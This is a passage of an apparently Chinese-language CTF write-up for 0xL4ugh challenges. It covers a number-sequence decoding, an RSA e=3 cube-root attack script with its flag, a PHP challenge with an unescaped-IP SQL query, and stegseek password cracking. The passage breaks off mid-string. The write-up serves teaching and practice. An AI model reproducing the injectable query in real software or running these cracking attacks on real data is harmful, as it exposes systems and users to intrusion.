class="hljs-number">12871257446113839333150161058369946</span>, <span class="hljs-number">25742514892227678666300322116739891</span>, <span class="hljs-number">51485029784455357332600644233479783</span>, <span class="hljs-number">102970059568910714665201288466959565</span>, <span class="hljs-number">205940119137821429330402576933919130</span>, <span class="hljs-number">411880238275642858660805153867838260</span>, <span class="hljs-number">823760476551285717321610307735676520</span>, <span class="hljs-number">1647520953102571434643220615471353041</span>, <span class="hljs-number">3295041906205142869286441230942706082</span>, <span class="hljs-number">6590083812410285738572882461885412163</span>, <span class="hljs-number">13180167624820571477145764923770824327</span>, <span class="hljs-number">26360335249641142954291529847541648653</span>, <span class="hljs-number">52720670499282285908583059695083297307</span>, <span class="hljs-number">105441340998564571817166119390166594613</span>, <span class="hljs-number">210882681997129143634332238780333189226</span>, <span class="hljs-number">421765363994258287268664477560666378453</span>, <span class="hljs-number">843530727988516574537328955121332756906</span>, <span class="hljs-number">1687061455977033149074657910242665513811</span>, <span class="hljs-number">3374122911954066298149315820485331027622</span>, <span class="hljs-number">6748245823908132596298631640970662055244</span>, <span class="hljs-number">13496491647816265192597263281941324110489</span>, <span class="hljs-number">26992983295632530385194526563882648220977</span>, <span class="hljs-number">53985966591265060770389053127765296441955</span>, <span class="hljs-number">107971933182530121540778106255530592883909</span>, <span class="hljs-number">215943866365060243081556212511061185767818</span>, <span class="hljs-number">431887732730120486163112425022122371535637</span>, <span class="hljs-number">863775465460240972326224850044244743071274</span>, <span class="hljs-number">1727550930920481944652449700088489486142548</span>, <span class="hljs-number">3455101861840963889304899400176978972285095</span>, <span class="hljs-number">6910203723681927778609798800353957944570190</span>, <span class="hljs-number">13820407447363855557219597600707915889140381</span>, <span class="hljs-number">27640814894727711114439195201415831778280761</span>, <span class="hljs-number">55281629789455422228878390402831663556561522</span>, <span class="hljs-number">110563259578910844457756780805663327113123044</span>, <span class="hljs-number">221126519157821688915513561611326654226246089</span>, <span class="hljs-number">442253038315643377831027123222653308452492178</span>, <span class="hljs-number">884506076631286755662054246445306616904984356</span>, <span class="hljs-number">1769012153262573511324108492890613233809968711</span>, <span class="hljs-number">3538024306525147022648216985781226467619937423</span>, <span class="hljs-number">7076048613050294045296433971562452935239874845</span>, <span class="hljs-number">14152097226100588090592867943124905870479749691</span>, <span class="hljs-number">28304194452201176181185735886249811740959499382</span>, <span class="hljs-number">56608388904402352362371471772499623481918998764</span>, <span class="hljs-number">113216777808804704724742943544999246963837997528</span>, <span class="hljs-number">226433555617609409449485887089998493927675995056</span>, <span class="hljs-number">452867111235218818898971774179996987855351990111</span>, <span class="hljs-number">905734222470437637797943548359993975710703980222</span>, <span class="hljs-number">1811468444940875275595887096719987951421407960445</span>, <span class="hljs-number">3622936889881750551191774193439975902842815920890</span>, <span class="hljs-number">7245873779763501102383548386879951805685631841779</span>, <span class="hljs-number">14491747559527002204767096773759903611371263683559</span>, <span class="hljs-number">28983495119054004409534193547519807222742527367117</span>, <span class="hljs-number">57966990238108008819068387095039614445485054734235</span>, <span class="hljs-number">115933980476216017638136774190079228890970109468469</span>, <span class="hljs-number">231867960952432035276273548380158457781940218936938</span>, <span class="hljs-number">463735921904864070552547096760316915563880437873877</span>, <span class="hljs-number">927471843809728141105094193520633831127760875747754</span>, <span class="hljs-number">1854943687619456282210188387041267662255521751495507</span>, <span class="hljs-number">3709887375238912564420376774082535324511043502991014</span>, <span class="hljs-number">7419774750477825128840753548165070649022087005982029</span>, <span class="hljs-number">14839549500955650257681507096330141298044174011964058</span>, <span class="hljs-number">29679099001911300515363014192660282596088348023928115</span>, <span class="hljs-number">59358198003822601030726028385320565192176696047856231</span>, <span class="hljs-number">118716396007645202061452056770641130384353392095712461</span>, <span class="hljs-number">237432792015290404122904113541282260768706784191424923</span>, <span class="hljs-number">474865584030580808245808227082564521537413568382849845</span>, <span class="hljs-number">949731168061161616491616454165129043074827136765699690</span>, <span class="hljs-number">1899462336122323232983232908330258086149654273531399380</span>, <span class="hljs-number">3798924672244646465966465816660516172299308547062798761</span>, <span class="hljs-number">7597849344489292931932931633321032344598617094125597521</span>, <span class="hljs-number">15195698688978585863865863266642064689197234188251195043</span>, <span class="hljs-number">30391397377957171727731726533284129378394468376502390085</span>, <span class="hljs-number">60782794755914343455463453066568258756788936753004780171</span>, <span class="hljs-number">121565589511828686910926906133136517513577873506009560341</span>, <span class="hljs-number">243131179023657373821853812266273035027155747012019120683</span>, <span class="hljs-number">486262358047314747643707624532546070054311494024038241365</span>, <span class="hljs-number">972524716094629495287415249065092140108622988048076482731</span>, <span class="hljs-number">1945049432189258990574830498130184280217245976096152965461</span>, <span class="hljs-number">3890098864378517981149660996260368560434491952192305930922</span>, <span class="hljs-number">7780197728757035962299321992520737120868983904384611861845</span>, <span class="hljs-number">15560395457514071924598643985041474241737967808769223723690</span>, <span class="hljs-number">31120790915028143849197287970082948483475935617538447447379</span>, <span class="hljs-number">62241581830056287698394575940165896966951871235076894894758</span>, <span class="hljs-number">124483163660112575396789151880331793933903742470153789789517</span>, <span class="hljs-number">248966327320225150793578303760663587867807484940307579579034</span>, <span class="hljs-number">497932654640450301587156607521327175735614969880615159158067</span>, <span class="hljs-number">995865309280900603174313215042654351471229939761230318316135</span>, <span class="hljs-number">1991730618561801206348626430085308702942459879522460636632269</span>, <span class="hljs-number">3983461237123602412697252860170617405884919759044921273264538</span>, <span class="hljs-number">7966922474247204825394505720341234811769839518089842546529077</span>, <span class="hljs-number">15933844948494409650789011440682469623539679036179685093058154</span>, <span class="hljs-number">31867689896988819301578022881364939247079358072359370186116308</span>, <span class="hljs-number">63735379793977638603156045762729878494158716144718740372232615</span>, <span class="hljs-number">127470759587955277206312091525459756988317432289437480744465230</span>, <span class="hljs-number">254941519175910554412624183050919513976634864578874961488930461</span>, <span class="hljs-number">509883038351821108825248366101839027953269729157749922977860921</span>, <span class="hljs-number">1019766076703642217650496732203678055906539458315499845955721842</span>, <span class="hljs-number">2039532153407284435300993464407356111813078916630999691911443684</span>, <span class="hljs-number">4079064306814568870601986928814712223626157833261999383822887368</span>, <span class="hljs-number">8158128613629137741203973857629424447252315666523998767645774737</span>, <span class="hljs-number">16316257227258275482407947715258848894504631333047997535291549474</span>, <span class="hljs-number">32632514454516550964815895430517697789009262666095995070583098947</span>, <span class="hljs-number">65265028909033101929631790861035395578018525332191990141166197894</span>, <span class="hljs-number">130530057818066203859263581722070791156037050664383980282332395789</span>, <span class="hljs-number">261060115636132407718527163444141582312074101328767960564664791578</span>, <span class="hljs-number">522120231272264815437054326888283164624148202657535921129329583155</span>, <span class="hljs-number">1044240462544529630874108653776566329248296405315071842258659166310</span>, <span class="hljs-number">2088480925089059261748217307553132658496592810630143684517318332621</span>, <span class="hljs-number">4176961850178118523496434615106265316993185621260287369034636665242</span>, <span class="hljs-number">8353923700356237046992869230212530633986371242520574738069273330483</span>, <span class="hljs-number">16707847400712474093985738460425061267972742485041149476138546660967</span>, <span class="hljs-number">33415694801424948187971476920850122535945484970082298952277093321934</span>, <span class="hljs-number">66831389602849896375942953841700245071890969940164597904554186643868</span>, <span class="hljs-number">133662779205699792751885907683400490143781939880329195809108373287736</span>, <span class="hljs-number">267325558411399585503771815366800980287563879760658391618216746575472</span>, <span class="hljs-number">534651116822799171007543630733601960575127759521316783236433493150943</span>, <span class="hljs-number">1069302233645598342015087261467203921150255519042633566472866986301887</span>]<br></code></pre></td></tr></table></figure><p>一个规律：<br>从第2个数开始，每个数与前面的数之和的差总为0或者1，由此可以得到2进制数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ct = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">79</span>, <span class="hljs-number">159</span>, <span class="hljs-number">317</span>, <span class="hljs-number">635</span>, <span class="hljs-number">1269</span>, <span class="hljs-number">2538</span>, <span class="hljs-number">5077</span>, <span class="hljs-number">10154</span>, <span class="hljs-number">20307</span>, <span class="hljs-number">40615</span>, <span class="hljs-number">81229</span>, <span class="hljs-number">162458</span>, <span class="hljs-number">324916</span>, <span class="hljs-number">649832</span>, <span class="hljs-number">1299665</span>, <span class="hljs-number">2599330</span>, <span class="hljs-number">5198659</span>, <span class="hljs-number">10397319</span>, <span class="hljs-number">20794638</span>, <span class="hljs-number">41589276</span>, <span class="hljs-number">83178552</span>, <span class="hljs-number">166357103</span>, <span class="hljs-number">332714207</span>, <span class="hljs-number">665428414</span>, <span class="hljs-number">1330856827</span>, <span class="hljs-number">2661713655</span>, <span class="hljs-number">5323427309</span>, <span class="hljs-number">10646854619</span>, <span class="hljs-number">21293709237</span>, <span class="hljs-number">42587418474</span>, <span class="hljs-number">85174836949</span>, <span class="hljs-number">170349673898</span>, <span class="hljs-number">340699347795</span>, <span class="hljs-number">681398695591</span>, <span class="hljs-number">1362797391181</span>, <span class="hljs-number">2725594782363</span>, <span class="hljs-number">5451189564725</span>, <span class="hljs-number">10902379129451</span>, <span class="hljs-number">21804758258901</span>, <span class="hljs-number">43609516517803</span>, <span class="hljs-number">87219033035605</span>, <span class="hljs-number">174438066071211</span>, <span class="hljs-number">348876132142421</span>, <span class="hljs-number">697752264284843</span>, <span class="hljs-number">1395504528569685</span>, <span class="hljs-number">2791009057139370</span>, <span class="hljs-number">5582018114278740</span>, <span class="hljs-number">11164036228557480</span>, <span class="hljs-number">22328072457114960</span>, <span class="hljs-number">44656144914229920</span>, <span class="hljs-number">89312289828459841</span>, <span class="hljs-number">178624579656919682</span>, <span class="hljs-number">357249159313839363</span>, <span class="hljs-number">714498318627678726</span>, <span class="hljs-number">1428996637255357453</span>, <span class="hljs-number">2857993274510714906</span>, <span class="hljs-number">5715986549021429811</span>, <span class="hljs-number">11431973098042859623</span>, <span class="hljs-number">22863946196085719246</span>, <span class="hljs-number">45727892392171438492</span>, <span class="hljs-number">91455784784342876983</span>, <span class="hljs-number">182911569568685753966</span>, <span class="hljs-number">365823139137371507933</span>, <span class="hljs-number">731646278274743015865</span>, <span class="hljs-number">1463292556549486031730</span>, <span class="hljs-number">2926585113098972063460</span>, <span class="hljs-number">5853170226197944126921</span>, <span class="hljs-number">11706340452395888253841</span>, <span class="hljs-number">23412680904791776507682</span>, <span class="hljs-number">46825361809583553015364</span>, <span class="hljs-number">93650723619167106030728</span>, <span class="hljs-number">187301447238334212061457</span>, <span class="hljs-number">374602894476668424122913</span>, <span class="hljs-number">749205788953336848245827</span>, <span class="hljs-number">1498411577906673696491653</span>, <span class="hljs-number">2996823155813347392983306</span>, <span class="hljs-number">5993646311626694785966613</span>, <span class="hljs-number">11987292623253389571933226</span>, <span class="hljs-number">23974585246506779143866452</span>, <span class="hljs-number">47949170493013558287732903</span>, <span class="hljs-number">95898340986027116575465806</span>, <span class="hljs-number">191796681972054233150931613</span>, <span class="hljs-number">383593363944108466301863225</span>, <span class="hljs-number">767186727888216932603726450</span>, <span class="hljs-number">1534373455776433865207452900</span>, <span class="hljs-number">3068746911552867730414905800</span>, <span class="hljs-number">6137493823105735460829811601</span>, <span class="hljs-number">12274987646211470921659623202</span>, <span class="hljs-number">24549975292422941843319246403</span>, <span class="hljs-number">49099950584845883686638492807</span>, <span class="hljs-number">98199901169691767373276985614</span>, <span class="hljs-number">196399802339383534746553971228</span>, <span class="hljs-number">392799604678767069493107942455</span>, <span class="hljs-number">785599209357534138986215884910</span>, <span class="hljs-number">1571198418715068277972431769821</span>, <span class="hljs-number">3142396837430136555944863539641</span>, <span class="hljs-number">6284793674860273111889727079282</span>, <span class="hljs-number">12569587349720546223779454158564</span>, <span class="hljs-number">25139174699441092447558908317129</span>, <span class="hljs-number">50278349398882184895117816634258</span>, <span class="hljs-number">100556698797764369790235633268515</span>, <span class="hljs-number">201113397595528739580471266537030</span>, <span class="hljs-number">402226795191057479160942533074061</span>, <span class="hljs-number">804453590382114958321885066148122</span>, <span class="hljs-number">1608907180764229916643770132296243</span>, <span class="hljs-number">3217814361528459833287540264592486</span>, <span class="hljs-number">6435628723056919666575080529184973</span>, <span class="hljs-number">12871257446113839333150161058369946</span>, <span class="hljs-number">25742514892227678666300322116739891</span>, <span class="hljs-number">51485029784455357332600644233479783</span>, <span class="hljs-number">102970059568910714665201288466959565</span>, <span class="hljs-number">205940119137821429330402576933919130</span>, <span class="hljs-number">411880238275642858660805153867838260</span>, <span class="hljs-number">823760476551285717321610307735676520</span>, <span class="hljs-number">1647520953102571434643220615471353041</span>, <span class="hljs-number">3295041906205142869286441230942706082</span>, <span class="hljs-number">6590083812410285738572882461885412163</span>, <span class="hljs-number">13180167624820571477145764923770824327</span>, <span class="hljs-number">26360335249641142954291529847541648653</span>, <span class="hljs-number">52720670499282285908583059695083297307</span>, <span class="hljs-number">105441340998564571817166119390166594613</span>, <span class="hljs-number">210882681997129143634332238780333189226</span>, <span class="hljs-number">421765363994258287268664477560666378453</span>, <span class="hljs-number">843530727988516574537328955121332756906</span>, <span class="hljs-number">1687061455977033149074657910242665513811</span>, <span class="hljs-number">3374122911954066298149315820485331027622</span>, <span class="hljs-number">6748245823908132596298631640970662055244</span>, <span class="hljs-number">13496491647816265192597263281941324110489</span>, <span class="hljs-number">26992983295632530385194526563882648220977</span>, <span class="hljs-number">53985966591265060770389053127765296441955</span>, <span class="hljs-number">107971933182530121540778106255530592883909</span>, <span class="hljs-number">215943866365060243081556212511061185767818</span>, <span class="hljs-number">431887732730120486163112425022122371535637</span>, <span class="hljs-number">863775465460240972326224850044244743071274</span>, <span class="hljs-number">1727550930920481944652449700088489486142548</span>, <span class="hljs-number">3455101861840963889304899400176978972285095</span>, <span class="hljs-number">6910203723681927778609798800353957944570190</span>, <span class="hljs-number">13820407447363855557219597600707915889140381</span>, <span class="hljs-number">27640814894727711114439195201415831778280761</span>, <span class="hljs-number">55281629789455422228878390402831663556561522</span>, <span class="hljs-number">110563259578910844457756780805663327113123044</span>, <span class="hljs-number">221126519157821688915513561611326654226246089</span>, <span class="hljs-number">442253038315643377831027123222653308452492178</span>, <span class="hljs-number">884506076631286755662054246445306616904984356</span>, <span class="hljs-number">1769012153262573511324108492890613233809968711</span>, <span class="hljs-number">3538024306525147022648216985781226467619937423</span>, <span class="hljs-number">7076048613050294045296433971562452935239874845</span>, <span class="hljs-number">14152097226100588090592867943124905870479749691</span>, <span class="hljs-number">28304194452201176181185735886249811740959499382</span>, <span class="hljs-number">56608388904402352362371471772499623481918998764</span>, <span class="hljs-number">113216777808804704724742943544999246963837997528</span>, <span class="hljs-number">226433555617609409449485887089998493927675995056</span>, <span class="hljs-number">452867111235218818898971774179996987855351990111</span>, <span class="hljs-number">905734222470437637797943548359993975710703980222</span>, <span class="hljs-number">1811468444940875275595887096719987951421407960445</span>, <span class="hljs-number">3622936889881750551191774193439975902842815920890</span>, <span class="hljs-number">7245873779763501102383548386879951805685631841779</span>, <span class="hljs-number">14491747559527002204767096773759903611371263683559</span>, <span class="hljs-number">28983495119054004409534193547519807222742527367117</span>, <span class="hljs-number">57966990238108008819068387095039614445485054734235</span>, <span class="hljs-number">115933980476216017638136774190079228890970109468469</span>, <span class="hljs-number">231867960952432035276273548380158457781940218936938</span>, <span class="hljs-number">463735921904864070552547096760316915563880437873877</span>, <span class="hljs-number">927471843809728141105094193520633831127760875747754</span>, <span class="hljs-number">1854943687619456282210188387041267662255521751495507</span>, <span class="hljs-number">3709887375238912564420376774082535324511043502991014</span>, <span class="hljs-number">7419774750477825128840753548165070649022087005982029</span>, <span class="hljs-number">14839549500955650257681507096330141298044174011964058</span>, <span class="hljs-number">29679099001911300515363014192660282596088348023928115</span>, <span class="hljs-number">59358198003822601030726028385320565192176696047856231</span>, <span class="hljs-number">118716396007645202061452056770641130384353392095712461</span>, <span class="hljs-number">237432792015290404122904113541282260768706784191424923</span>, <span class="hljs-number">474865584030580808245808227082564521537413568382849845</span>, <span class="hljs-number">949731168061161616491616454165129043074827136765699690</span>, <span class="hljs-number">1899462336122323232983232908330258086149654273531399380</span>, <span class="hljs-number">3798924672244646465966465816660516172299308547062798761</span>, <span class="hljs-number">7597849344489292931932931633321032344598617094125597521</span>, <span class="hljs-number">15195698688978585863865863266642064689197234188251195043</span>, <span class="hljs-number">30391397377957171727731726533284129378394468376502390085</span>, <span class="hljs-number">60782794755914343455463453066568258756788936753004780171</span>, <span class="hljs-number">121565589511828686910926906133136517513577873506009560341</span>, <span class="hljs-number">243131179023657373821853812266273035027155747012019120683</span>, <span class="hljs-number">486262358047314747643707624532546070054311494024038241365</span>, <span class="hljs-number">972524716094629495287415249065092140108622988048076482731</span>, <span class="hljs-number">1945049432189258990574830498130184280217245976096152965461</span>, <span class="hljs-number">3890098864378517981149660996260368560434491952192305930922</span>, <span class="hljs-number">7780197728757035962299321992520737120868983904384611861845</span>, <span class="hljs-number">15560395457514071924598643985041474241737967808769223723690</span>, <span class="hljs-number">31120790915028143849197287970082948483475935617538447447379</span>, <span class="hljs-number">62241581830056287698394575940165896966951871235076894894758</span>, <span class="hljs-number">124483163660112575396789151880331793933903742470153789789517</span>, <span class="hljs-number">248966327320225150793578303760663587867807484940307579579034</span>, <span class="hljs-number">497932654640450301587156607521327175735614969880615159158067</span>, <span class="hljs-number">995865309280900603174313215042654351471229939761230318316135</span>, <span class="hljs-number">1991730618561801206348626430085308702942459879522460636632269</span>, <span class="hljs-number">3983461237123602412697252860170617405884919759044921273264538</span>, <span class="hljs-number">7966922474247204825394505720341234811769839518089842546529077</span>, <span class="hljs-number">15933844948494409650789011440682469623539679036179685093058154</span>, <span class="hljs-number">31867689896988819301578022881364939247079358072359370186116308</span>, <span class="hljs-number">63735379793977638603156045762729878494158716144718740372232615</span>, <span class="hljs-number">127470759587955277206312091525459756988317432289437480744465230</span>, <span class="hljs-number">254941519175910554412624183050919513976634864578874961488930461</span>, <span class="hljs-number">509883038351821108825248366101839027953269729157749922977860921</span>, <span class="hljs-number">1019766076703642217650496732203678055906539458315499845955721842</span>, <span class="hljs-number">2039532153407284435300993464407356111813078916630999691911443684</span>, <span class="hljs-number">4079064306814568870601986928814712223626157833261999383822887368</span>, <span class="hljs-number">8158128613629137741203973857629424447252315666523998767645774737</span>, <span class="hljs-number">16316257227258275482407947715258848894504631333047997535291549474</span>, <span class="hljs-number">32632514454516550964815895430517697789009262666095995070583098947</span>, <span class="hljs-number">65265028909033101929631790861035395578018525332191990141166197894</span>, <span class="hljs-number">130530057818066203859263581722070791156037050664383980282332395789</span>, <span class="hljs-number">261060115636132407718527163444141582312074101328767960564664791578</span>, <span class="hljs-number">522120231272264815437054326888283164624148202657535921129329583155</span>, <span class="hljs-number">1044240462544529630874108653776566329248296405315071842258659166310</span>, <span class="hljs-number">2088480925089059261748217307553132658496592810630143684517318332621</span>, <span class="hljs-number">4176961850178118523496434615106265316993185621260287369034636665242</span>, <span class="hljs-number">8353923700356237046992869230212530633986371242520574738069273330483</span>, <span class="hljs-number">16707847400712474093985738460425061267972742485041149476138546660967</span>, <span class="hljs-number">33415694801424948187971476920850122535945484970082298952277093321934</span>, <span class="hljs-number">66831389602849896375942953841700245071890969940164597904554186643868</span>, <span class="hljs-number">133662779205699792751885907683400490143781939880329195809108373287736</span>, <span class="hljs-number">267325558411399585503771815366800980287563879760658391618216746575472</span>, <span class="hljs-number">534651116822799171007543630733601960575127759521316783236433493150943</span>, <span class="hljs-number">1069302233645598342015087261467203921150255519042633566472866986301887</span>]<br>x = <span class="hljs-number">0</span><br>y = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(ct)):<br>   y += <span class="hljs-built_in">str</span>(ct[i]-x)<br>   x += ct[i]<br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-comment">#100111101010011010000110111101101010011010101010101000000110011011100100010000101001110010000110111001000110011001101000011010100110001010011100100011101011111001101010011001101010001010101010011001101001110010000110011001101111101</span><br><br></code></pre></td></tr></table></figure><p>发现只有231位，前面要补一个0<br><img src="/mdimg/0xl4/15.png"></p><h3 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto 2"></a>Crypto 2</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>the professor asked the students to write a paragraph of a story each and submit it by email. But some students copied answers!<br>format : OSC{}</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> messages<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RSA_encrypt</span>(<span class="hljs-params">message</span>):<br>    m = bytes_to_long(message)<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    N = p * q<br>    e = <span class="hljs-number">3</span><br>    c = <span class="hljs-built_in">pow</span>(m, e, N)<br>    <span class="hljs-keyword">return</span> N, e, c<br><br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages:<br>    N, e, c = RSA_encrypt(m)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;N&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>显然低加密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">16691865792147194697602300512532851182049374635648801189035809706515463120586646192481229145243032049569188562652509317620313234450062651687702398851985141210252080200118496555573100538082230667123330012596663673730204381449416210246747100065137562877723883087453655498192797717322414163929033958154847172474876805828355467779563924126108244847992313964795565023554963296215243179420547862638306573737884301209065640499511319512400331964327680966267406302192650421152395257843371809022919488155958420254813754963104236903270765037373600427365083337259089056941701762267110792581437924801009323096077817633370816094073</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">527715545190279160683427564102415343921040361668522479441727171363460126920288425567651662947621100428078618585624707291232885706132068328305084115992340337032439274527186826778447854890982475878955397378947713414201050357209397140391734937299379698886378260075489810871914081834819238233619226377140629000968272406078503709732856007314599153696811725183993977424740513321277346005097500256459835713834182894305536107589525724571208098322359262186595358977825573193007799376102473240254372327730839223120373818874006086733633525830272119104666835113980722223258389364156995110666626033474727892354233040278510447646</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">n, e, c</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        m1 = k * n + c<br>        m, t = gmpy2.iroot(m1, e)<br>        <span class="hljs-keyword">if</span> t:<br>            <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br>            <span class="hljs-keyword">break</span><br>        k += <span class="hljs-number">1</span><br><br>exp(n, e, c)<br><span class="hljs-comment">#b&#x27;OSC&#123;C0N6r47U14710N5!_Y0U_UND3r574ND_H0W_70_U53_H4574D5_8r04DC457_4774CK_______0xL4ugh&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Detected"><a href="#Detected" class="headerlink" title="Detected"></a>Detected</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>Can you be undetected ?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>session_start();<br>$servername = <span class="hljs-string">&quot;localhost&quot;</span>;<br>$username = <span class="hljs-string">&quot;root&quot;</span>;<br>$dbname = <span class="hljs-string">&quot;ctf_test&quot;</span>;<br>$password = <span class="hljs-string">&quot;&quot;</span>;<br>// Create connection<br>$conn = new mysqli($servername, $username, $password,$dbname);<br><br>// Check connection<br><span class="hljs-keyword">if</span> ($conn-&gt;connect_error) &#123;<br>    die(<span class="hljs-string">&quot;Connection failed: &quot;</span> . $conn-&gt;connect_error);<br>&#125;<br><br>$session=mysqli_real_escape_string($conn,$_COOKIE[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]);<br>$ip=$_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><br><br><br>$conn-&gt;query(<span class="hljs-string">&quot;INSERT into misc (ip,phpsess)values(&#x27;$ip&#x27;,&#x27;$session&#x27;)&quot;</span>);<br><br><span class="hljs-keyword">if</span>($conn-&gt;query(<span class="hljs-string">&quot;select Distinct ip from misc where phpsess=&#x27;$session&#x27;&quot;</span>)-&gt;num_rows &gt;<span class="hljs-number">20</span>)<br>&#123;<br>    echo <span class="hljs-string">&quot;Flag&#123;here&#125;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    echo <span class="hljs-string">&quot;Still Not 20 ip yet :D&quot;</span>;<br>&#125;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开就看到了flag<br><img src="/mdimg/0xl4/6.png"></p><h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>0xL4ugh&#123;W3LC0ME_T0_0UR_C7F_FREE_PALESTINE&#125;</code></p><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><h3 id="Uraa"><a href="#Uraa" class="headerlink" title="Uraa"></a>Uraa</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>I love Urahara. he keeps hiding the secrets.</p><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="https://github.com/RickdeJager/stegseek/releases/tag/v0.6">https://github.com/RickdeJager/stegseek/releases/tag/v0.6</a><br>下载deb包<br>安装：<br><code>sudo apt install ./stegseek_0.6-1.deb </code><br><code>stegseek --crack ./Uraa.jpg</code><br><img src="/mdimg/0xl4/7.png"><br><img src="/mdimg/0xl4/8.png"></p><h3 id="Zar"><a href="#Zar" class="headerlink" title="Zar"></a>Zar</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>Fast as zaraki boi. try to find him.</p><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/9.png"><br>20转0，09转1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=<span class="hljs-string">&#x27;20 20 20 20 09 09 20 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 20 20 09 09 